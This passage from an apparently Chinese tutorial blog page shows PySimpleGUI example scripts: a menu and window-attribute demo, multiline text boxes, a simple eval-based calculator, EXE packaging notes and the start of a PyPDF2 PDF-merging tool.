[[sg.In()] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">]</span><br><span class="line">window = sg.Window(<span class="string">&#x27;菜单演示&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;打开::open&#x27;</span>:</span><br><span class="line">        sg.Popup(<span class="string">&#x27;ggg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="40window窗口常用属性-py"><a href="#40window窗口常用属性-py" class="headerlink" title="40window窗口常用属性.py"></a>40window窗口常用属性.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">title, # 窗口标题设定</span></span><br><span class="line"><span class="string">layout=None, # 布局设定</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">menu=[</span><br><span class="line">    [<span class="string">&#x27;文件(&amp;F)&#x27;</span>,[<span class="string">&#x27;新建&#x27;</span>,<span class="string">&#x27;打开::open&#x27;</span>,<span class="string">&#x27;!保存&#x27;</span>,<span class="string">&#x27;---&#x27;</span>,<span class="string">&#x27;退出&#x27;</span>]],</span><br><span class="line">    [<span class="string">&#x27;编辑&#x27;</span>,[<span class="string">&#x27;撤销&#x27;</span>,<span class="string">&#x27;重做&#x27;</span>,<span class="string">&#x27;剪切&#x27;</span>,<span class="string">&#x27;保存&#x27;</span>]],</span><br><span class="line">    [<span class="string">&#x27;帮助&#x27;</span>,[<span class="string">&#x27;检查更新&#x27;</span>,<span class="string">&#x27;使用指南&#x27;</span>,<span class="string">&#x27;关于&#x27;</span>]]</span><br><span class="line">]</span><br><span class="line">layout=[</span><br><span class="line">    [sg.Menu(menu,key=<span class="string">&#x27;-a-&#x27;</span>,tearoff=<span class="literal">True</span>)],</span><br><span class="line">    [[sg.In()] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)],</span><br><span class="line">    [sg.B(<span class="string">&#x27;确定&#x27;</span>),sg.B(<span class="string">&#x27;取消&#x27;</span>)]</span><br><span class="line">]</span><br><span class="line">window = sg.Window(<span class="string">&#x27;菜单演示&#x27;</span>, layout,</span><br><span class="line">location=(<span class="literal">None</span>,<span class="literal">None</span>), <span class="comment"># 窗口的位置</span></span><br><span class="line">size=(<span class="number">500</span>,<span class="number">300</span>), <span class="comment"># 窗口宽高设定</span></span><br><span class="line">element_padding=(<span class="number">20</span>,<span class="number">10</span>), <span class="comment"># 元素间间隔设定</span></span><br><span class="line">button_color=(<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;black&#x27;</span>), <span class="comment"># 按钮元素颜色设定（文本颜色，背景颜色）</span></span><br><span class="line">background_color=<span class="string">&#x27;grey&#x27;</span>,  <span class="comment"># 背景色</span></span><br><span class="line">font=<span class="literal">None</span>, <span class="comment"># 可以设置字体名称，大小等。</span></span><br><span class="line">auto_close=<span class="literal">False</span>, <span class="comment"># 界面自动关闭</span></span><br><span class="line">auto_close_duration=<span class="literal">None</span>, <span class="comment"># 自动关闭窗口之前界面持续的时间（以秒为单位）</span></span><br><span class="line">no_titlebar=<span class="literal">False</span>, <span class="comment"># 不显示标题栏</span></span><br><span class="line">grab_anywhere=<span class="literal">False</span>, <span class="comment"># 如果为True, 拖动界面进行移动</span></span><br><span class="line">keep_on_top=<span class="literal">False</span>, <span class="comment"># 如果为True， 保持界面在屏幕的最前方</span></span><br><span class="line">resizable=<span class="literal">False</span>, <span class="comment"># 如果为True，界面生成后可以调整大小</span></span><br><span class="line">disable_close=<span class="literal">False</span>, <span class="comment"># 如果为True, 窗口关闭按钮将不起作用</span></span><br><span class="line">disable_minimize=<span class="literal">False</span>, <span class="comment"># 如果为True，窗口最小化按钮将不起作用</span></span><br><span class="line">right_click_menu=<span class="literal">None</span>, <span class="comment"># 右击调出菜单</span></span><br><span class="line">transparent_color=<span class="literal">None</span>, <span class="comment"># 界面透明度设定=sg.theme_background_color()</span></span><br><span class="line">element_justification=<span class="string">&#x27;left&#x27;</span>, <span class="comment"># 元素对齐方式设定。有效值：left,right,center</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;打开::open&#x27;</span>:</span><br><span class="line">        sg.Popup(<span class="string">&#x27;ggg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="41多行文本框（1）-py"><a href="#41多行文本框（1）-py" class="headerlink" title="41多行文本框（1）.py"></a>41多行文本框（1）.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">text1=<span class="string">&#x27;&#x27;&#x27;咏梅</span></span><br><span class="line"><span class="string">风雨送春归，飞雪迎春到。</span></span><br><span class="line"><span class="string">已是悬崖百丈冰，犹有花枝俏。</span></span><br><span class="line"><span class="string">俏也不争春，只把春来报。</span></span><br><span class="line"><span class="string">待到山花烂漫时，她在丛中笑。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.ML(default_text=text1, <span class="comment"># 默认显示的文本</span></span><br><span class="line">            disabled=<span class="literal">False</span>, <span class="comment"># 元素禁用状态设定</span></span><br><span class="line">            border_width=<span class="literal">None</span>, <span class="comment"># 边界线条宽度设定</span></span><br><span class="line">            size=(<span class="number">50</span>,<span class="number">6</span>), <span class="comment"># 宽度和行高设定</span></span><br><span class="line">            background_color=<span class="literal">None</span>, <span class="comment"># 背景颜色设定</span></span><br><span class="line">            text_color=<span class="literal">None</span>, <span class="comment"># 文本颜色设定</span></span><br><span class="line">            enable_events=<span class="literal">True</span>, <span class="comment"># 元素事件属性</span></span><br><span class="line">            key=<span class="string">&#x27;-TEXT-&#x27;</span>, <span class="comment"># 元素的唯一标识符</span></span><br><span class="line">            write_only=<span class="literal">False</span>, <span class="comment"># 设定为True时，文本框只提供用户写入，窗口不读取，无返回值</span></span><br><span class="line">            reroute_stdout=<span class="literal">False</span>, <span class="comment"># print语句内容会显示在此文本框内</span></span><br><span class="line">            reroute_cprint=<span class="literal">True</span>, <span class="comment"># 使用cprint将内容打印到此文本框内。详细参考sg.cprint()</span></span><br><span class="line">            reroute_stderr=<span class="literal">False</span>, <span class="comment"># 捕捉异常时将文本写在此元素内。sys.stderr.write(&#x27;?&#x27;)</span></span><br><span class="line">            autoscroll=<span class="literal">True</span>, <span class="comment"># 如果为True，更多数据添加到末尾时元素的内容将自动滚动</span></span><br><span class="line">            focus=<span class="literal">False</span>, <span class="comment"># 焦点设置</span></span><br><span class="line">            font=<span class="literal">None</span>, <span class="comment"># 字体名称和大小设定</span></span><br><span class="line">            pad=<span class="literal">None</span>, <span class="comment"># 和周围元素间间隔设定</span></span><br><span class="line">            tooltip=<span class="literal">None</span>, <span class="comment"># 悬浮文本设定</span></span><br><span class="line">            justification=<span class="literal">None</span>, <span class="comment"># 对齐方式设定</span></span><br><span class="line">            right_click_menu=<span class="literal">None</span>, <span class="comment"># 右击调出菜单设定</span></span><br><span class="line">            visible=<span class="literal">True</span>, <span class="comment"># 元素可见状态设定</span></span><br><span class="line">            do_not_clear=<span class="literal">True</span>, <span class="comment"># 默认为True，如果设定为False，窗口读取一次，内容就会自动清除</span></span><br><span class="line"></span><br><span class="line">    )],</span><br><span class="line">    [sg.OK(),sg.Cancel()]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;多行文本演示&#x27;</span>,layout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-TEXT-&#x27;</span>].update(</span><br><span class="line">            value=<span class="string">&#x27;你好！&#x27;</span>, <span class="comment"># 更新内容</span></span><br><span class="line">            disabled=<span class="literal">None</span>, <span class="comment"># 元素禁用</span></span><br><span class="line">            append=<span class="literal">False</span>, <span class="comment"># 如果设定为True,要更新的内容会接在原来文本的下方。原来的文本不会消失。</span></span><br><span class="line">            background_color=<span class="literal">None</span>,  <span class="comment"># 背景颜色设定</span></span><br><span class="line">            text_color=<span class="literal">None</span>,  <span class="comment"># 文本颜色设定</span></span><br><span class="line">            text_color_for_value=<span class="literal">None</span>, <span class="comment"># 更新文本的字体颜色设定</span></span><br><span class="line">            background_color_for_value=<span class="literal">None</span>, <span class="comment"># 更新文本的背景颜色设定</span></span><br><span class="line">            autoscroll=<span class="literal">True</span>,  <span class="comment"># 如果为True，更多数据添加到末尾时元素的内容将自动滚动</span></span><br><span class="line">            font=<span class="literal">None</span>,  <span class="comment"># 字体名称和大小设定</span></span><br><span class="line">            justification=<span class="literal">None</span>,  <span class="comment"># 对齐方式设定</span></span><br><span class="line">            visible=<span class="literal">True</span>,  <span class="comment"># 元素可见状态设定</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;Cancel&#x27;</span>:</span><br><span class="line">        sg.cprint(<span class="string">&#x27;Cancel&#x27;</span>,<span class="string">&#x27;你按了取消&#x27;</span>,</span><br><span class="line">                  end=<span class="literal">None</span>, <span class="comment"># 结束符 默认为回车键</span></span><br><span class="line">                  sep=<span class="string">&quot;&quot;</span>, <span class="comment"># 分隔符 默认为空格键</span></span><br><span class="line">                  background_color=<span class="literal">None</span>,  <span class="comment"># 背景颜色设定,可以简写成b</span></span><br><span class="line">                  text_color=<span class="literal">None</span>,  <span class="comment"># 文本颜色设定,可以简写成t</span></span><br><span class="line">                  colors=<span class="literal">None</span>, <span class="comment"># 简写c</span></span><br><span class="line">                  key=<span class="literal">None</span>, <span class="comment"># weiyibiaoshifu</span></span><br><span class="line">                  justification=<span class="string">&#x27;r&#x27;</span>, <span class="comment"># 文本对齐方式</span></span><br><span class="line"></span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="42多行文本框（2）-py"><a href="#42多行文本框（2）-py" class="headerlink" title="42多行文本框（2）.py"></a>42多行文本框（2）.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print方法</span></span><br><span class="line"><span class="string">window[key].print()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.ML(key=<span class="string">&#x27;-TEXT-&#x27;</span>)],</span><br><span class="line">    [sg.OK(),</span><br><span class="line">     sg.VerticalSeparator(color=<span class="string">&#x27;red&#x27;</span>, key=<span class="literal">None</span>, pad=((<span class="number">10</span>,<span class="number">10</span>),(<span class="number">10</span>,<span class="number">10</span>))),</span><br><span class="line">     sg.Cancel()]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window=sg.Window(<span class="string">&#x27;多行文本演示&#x27;</span>,layout)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;OK&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-TEXT-&#x27;</span>].<span class="built_in">print</span>(<span class="string">&#x27;你好！&#x27;</span>,<span class="string">&#x27;我是程序员无声&#x27;</span>,</span><br><span class="line">                               end=<span class="literal">None</span>,  <span class="comment"># 结束符 默认为回车键 end=&#x27;\\n&#x27;</span></span><br><span class="line">                               sep=<span class="string">&quot;--&quot;</span>,  <span class="comment"># 分隔符 默认为空格键</span></span><br><span class="line">                               background_color=<span class="literal">None</span>,  <span class="comment"># 背景颜色设定</span></span><br><span class="line">                               text_color=<span class="literal">None</span>,  <span class="comment"># 文本颜色设定</span></span><br><span class="line">                               justification=<span class="string">&#x27;r&#x27;</span>,  <span class="comment"># 文本对齐方式</span></span><br><span class="line">                               )</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;Cancel&#x27;</span>:</span><br><span class="line">        sg.cprint(<span class="string">&#x27;Cancel&#x27;</span>,<span class="string">&#x27;你按了取消&#x27;</span>,)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="43综合练习编写计算器-py"><a href="#43综合练习编写计算器-py" class="headerlink" title="43综合练习编写计算器.py"></a>43综合练习编写计算器.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">button</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> sg.B(text,pad=(<span class="number">2</span>,<span class="number">2</span>),size=(<span class="number">4</span>,<span class="number">2</span>),font=(<span class="string">&#x27;黑体&#x27;</span>,<span class="number">18</span>),button_color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"></span><br><span class="line">layout=[</span><br><span class="line">    [sg.T(<span class="string">&#x27;&#x27;</span>,key=<span class="string">&#x27;-SHOW-&#x27;</span>)],</span><br><span class="line">    [sg.In(<span class="string">&#x27;&#x27;</span>,size=(<span class="number">12</span>,<span class="number">2</span>),font=(<span class="string">&#x27;黑体&#x27;</span>,<span class="number">28</span>),key=<span class="string">&#x27;-INPUT-&#x27;</span>)],</span><br><span class="line">    [button(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;AC&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;%&#x27;</span>]],</span><br><span class="line">    [button(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;123+&#x27;</span>],</span><br><span class="line">    [button(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;456-&#x27;</span>],</span><br><span class="line">    [button(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;789X&#x27;</span>],</span><br><span class="line">    [button(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;0.=÷&#x27;</span>],</span><br><span class="line">    [sg.B(<span class="string">&#x27;←&#x27;</span>,pad=(<span class="number">2</span>,<span class="number">2</span>),size=(<span class="number">19</span>,<span class="number">2</span>),font=(<span class="string">&#x27;黑体&#x27;</span>,<span class="number">18</span>),button_color=<span class="string">&#x27;black&#x27;</span>)],</span><br><span class="line">]</span><br><span class="line">window=sg.Window(<span class="string">&#x27;计算器&#x27;</span>,layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event,values=window.read()</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> <span class="built_in">list</span>(<span class="string">&#x27;0123456789+-().&#x27;</span>):</span><br><span class="line">        window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(values[<span class="string">&#x27;-INPUT-&#x27;</span>]+event)</span><br><span class="line">        window[<span class="string">&#x27;-SHOW-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(values[<span class="string">&#x27;-INPUT-&#x27;</span>] + <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        window[<span class="string">&#x27;-SHOW-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;÷&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(values[<span class="string">&#x27;-INPUT-&#x27;</span>] + <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        window[<span class="string">&#x27;-SHOW-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(<span class="built_in">eval</span>(values[<span class="string">&#x27;-INPUT-&#x27;</span>] + <span class="string">&#x27;/100&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            window[<span class="string">&#x27;-SHOW-&#x27;</span>].update(<span class="string">&#x27;输入有误&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(<span class="built_in">eval</span>(values[<span class="string">&#x27;-INPUT-&#x27;</span>]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            window[<span class="string">&#x27;-SHOW-&#x27;</span>].update(<span class="string">&#x27;输入有误&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;AC&#x27;</span>:</span><br><span class="line">        window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        window[<span class="string">&#x27;-SHOW-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="string">&#x27;←&#x27;</span>:</span><br><span class="line">        newValue = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(values[<span class="string">&#x27;-INPUT-&#x27;</span>]) - <span class="number">1</span>:</span><br><span class="line">            newValue += values[<span class="string">&#x27;-INPUT-&#x27;</span>][i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        window[<span class="string">&#x27;-INPUT-&#x27;</span>].update(newValue)</span><br><span class="line">        window[<span class="string">&#x27;-SHOW-&#x27;</span>].update(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="44把py文件打包成EXE应用程序-txt"><a href="#44把py文件打包成EXE应用程序-txt" class="headerlink" title="44把py文件打包成EXE应用程序.txt"></a>44把py文件打包成EXE应用程序.txt</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">打包工具的安装方法：</span><br><span class="line"><span class="number">1.</span>按WIN+R打开运行。</span><br><span class="line"><span class="number">2.</span>输入cmd后确认。</span><br><span class="line"><span class="number">3.</span>输入命令：pip install pysimplegui-exemaker</span><br><span class="line"></span><br><span class="line">打包工具的运行方法：</span><br><span class="line"><span class="number">1.</span>按WIN+R打开运行。</span><br><span class="line"><span class="number">2.</span>输入cmd后确认。</span><br><span class="line"><span class="number">3.</span>输入命令：python -m pysimplegui-exemaker.pysimplegui-exemaker</span><br><span class="line"></span><br><span class="line">已安装对应环境的情况下，直接修改.py文件后缀名为.pyw即可双击运行</span><br></pre></td></tr></table></figure>

<h1 id="45编写带界面的PDF合并工具-py"><a href="#45编写带界面的PDF合并工具-py" class="headerlink" title="45编写带界面的PDF合并工具.py"></a>45编写带界面的PDF合并工具.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用PyPDF2模块合并同一文件夹下的所有PDF文件</span></span><br><span class="line"><span class="comment"># 只需修改存放PDF文件的文件夹变量：file_dir和输出文件名变量：output_file</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PyPDF2 <span class="keyword">import</span> PdfFileReader,PdfFileWriter</span><br><span class="line"><span class="comment"># 使用os模块的walk函数，搜索出指定目录下的全部PDF文件</span></span><br><span class="line"><span class="comment"># 获取同一目录下的所有PDF文件的绝对路径</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FileNameGet</span>(<span class="params">filedir</span>):</span><br><span class="line">    files_list = [os.path.join(root, filespath) \</span><br><span class="line">                  <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(filedir) \</span><br><span class="line">                  <span class="keyword">for</span> filespath <span class="keyword">in</span> files \</span><br><span class="line">                  <span class="keyword">if</span> <span class="built_in">str</span>(filespath).endswith(<span class="string">&#x27;pdf&#x27;</span>)]</span><br><span class="line">    <span class="keyword">return</span> files_list <span class="keyword">if</span> files_list <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并同一目录下的所有PDF文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PDFMerge</span>(<span class="params">filepath, output_file</span>):</span><br><span class="line">    output = PdfFileWriter()</span><br><span class="line">    output_pages = <span class="number">0</span></span><br><span class="line">    pdf_file_name = FileNameGet(filepath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pdf_file_name:</span><br><span class="line">        <span class="keyword">for</span> pdf_file <span class="keyword">in</span> pdf_file_name:</span><br><span class="line">            sg.cprint(<span class="string">&#x27;路径：%s&#x27;</span> % pdf_file)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 读取源PDF文件</span></span><br><span class="line">            <span class="built_in">input</span> = PdfFileReader(<span class="built_in">open</span>(pdf_file, <span class="string">&quot;rb&quot;</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 获得源PDF文件中页面总数</span></span><br><span class="line">            page_count = <span class="built_in">input</span>.getNumPages()</span><br><span class="line">            output_pages += page_count</span><br><span class="line">            sg.cprint(<span class="string">&#x27;页数：%d&#x27;</span> % page_count)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 分别将page添加到输出output中</span></span><br><span class="line">            <span class="keyword">for</span> iPage <span class="keyword">in</span> <span class="built_in">range</span>(page_count):</span><br><span class="line">                